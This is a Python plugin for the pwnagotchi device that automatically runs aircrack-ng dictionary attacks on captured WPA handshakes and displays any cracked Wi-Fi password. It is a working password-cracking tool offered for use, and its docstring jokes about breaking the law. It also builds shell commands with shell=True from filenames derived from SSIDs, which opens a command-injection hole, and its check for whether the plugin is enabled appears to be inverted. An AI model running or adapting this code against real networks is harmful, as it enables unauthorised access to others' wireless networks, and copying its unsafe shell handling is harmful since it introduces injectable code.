__author__ = 'forrest'
__version__ = '1.0.2'
__name__ = 'quickdic'
__license__ = 'GPL3'
__description__ = 'Run a quick dictionary scan against captured handshakes, skip jail.'

'''
Aircrack-ng needed, to install:
> apt-get install aircrack-ng
Upload wordlist files in .txt format to folder in config file (Default: /opt/wordlists/)
Cracked handshakes stored in handshake folder as [essid].pcap.cracked 

For educational and testing purposes, only. If you do not think that you have violated the law,
you most certainly are about to. By using and enabling the full functionality of this script,
you here by agree to sit quietly in the back of the police car.
'''

import logging
import json
import os
import subprocess
import string
import re
from collections import namedtuple
from pwnagotchi.utils import StatusFile

READY = False
OPTIONS = dict()
REPORT = StatusFile('/root/.aircracked_pcaps', data_format='json')
TEXT_TO_SET = ''

PwndNetwork = namedtuple('PwndNetwork', 'ssid bssid password')
handshake_file_re = re.compile('^(?P<ssid>.+?)_(?P<bssid>[a-f0-9]{12})\.pcap\.cracked$')
crackable_handshake_re = re.compile('\s+\d+\s+(?P<bssid>([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2})\s+(?P<ssid>.+?)\s+((\([1-9][0-9]* handshake(, with PMKID)?\))|(\(\d+ handshake, with PMKID\)))')


def on_loaded():
    global READY
    logging.info('[quickdic] Aircrack-ng dictionary attack plugin loaded.')
    READY = True


def on_ready(agent):
    global REPORT

    if not READY:
        return

    try:
        config = agent.config()
        reported = REPORT.data_field_or('reported', default=list())
        all_pcap_files = [os.path.join(config['bettercap']['handshakes'], filename) for filename in os.listdir(config['bettercap']['handshakes']) if filename.endswith('.pcap')]
        new_pcap_files = set(all_pcap_files) - set(reported)

        if not new_pcap_files:
            return

        for pcap_file in new_pcap_files:
            logging.info('[quickdic] Running uncracked pcap through aircrack: %s'%(pcap_file))
            try:
                _do_crack(agent, pcap_file)
                reported.append(pcap_file)
                REPORT.update(data={'reported': reported})
            except:
                continue

    except Exception as e:
        logging.error('[quickdic] Encountered exception in on_ready: %s'%(e))


def on_handshake(agent, filename, access_point, client_station):
    global REPORT 
    try:
        reported = REPORT.data_field_or('reported', default=list())
        if filename not in reported:
            _do_crack(agent, filename)
            reported.append(filename)
            REPORT.update(data={'reported': reported})
    except Exception as e:
        logging.error('[quickdic] Encountered exception in on_handshake: %s'%(e))


def set_text(text):
    global TEXT_TO_SET
    TEXT_TO_SET = text


def on_ui_update(ui):
    global TEXT_TO_SET
    if TEXT_TO_SET:
        ui.set('face', '(XωX)')
        ui.set('status', TEXT_TO_SET)
        TEXT_TO_SET = ''


def _do_crack(agent, filename):
    config = agent.config()    
    display = agent._view

    try:
        if config['main']['plugins']['quickdic']['enabled'] == 'true':
            logging.warning('[quickdic] Plugin quickdic is enabled. Cannot run with quickdic enabled...')
            return
    except Exception as e:
        logging.warning('[quickdic] Exception while checking for quickdic plugin in config file: %s', e)

    try:
        aircrack_execution = subprocess.run('/usr/bin/aircrack-ng %s'%(filename), shell=True, stdout=subprocess.PIPE)
        result = aircrack_execution.stdout.decode('utf-8').strip()
    except Exception as e:
        logging.warning('[quickdic] Exception while running initial aircrack-ng check: %s', e)
        return

    crackable_handshake = crackable_handshake_re.search(result)
    if not crackable_handshake:
        #logging.info('[quickdic] No handshakes found. Aircrack-ng output: %s', result)
        return
  
    logging.info('[quickdic] Confirmed handshakes captured for BSSID: %s', crackable_handshake.group('bssid'))

    try:        
        aircrack_execution_2 = subprocess.run(('aircrack-ng -w `echo '+os.path.join(OPTIONS['wordlist_folder'],'*.txt')+' | sed \'s/\ /,/g\'` -l '+filename+'.cracked -q '+filename+' -b '+crackable_handshake.group('bssid')+' -p 1 | grep KEY'),shell=True,stdout=subprocess.PIPE)
        crack_result = aircrack_execution_2.stdout.decode('utf-8').strip()
    except Exception as e:
        logging.error('[quickdic] Exception while running aircrack-ng for %s: %s'%(crackable_handshake.group('bssid'),e))
        return

    if crack_result != 'KEY NOT FOUND':
        key = re.search('\[(.*)\]', crack_result)
        logging.info('[quickdic] Aircrack output: '+crack_result)
        set_text('Cracked password: '+str(key.group(1)))
        display.update(force=True)

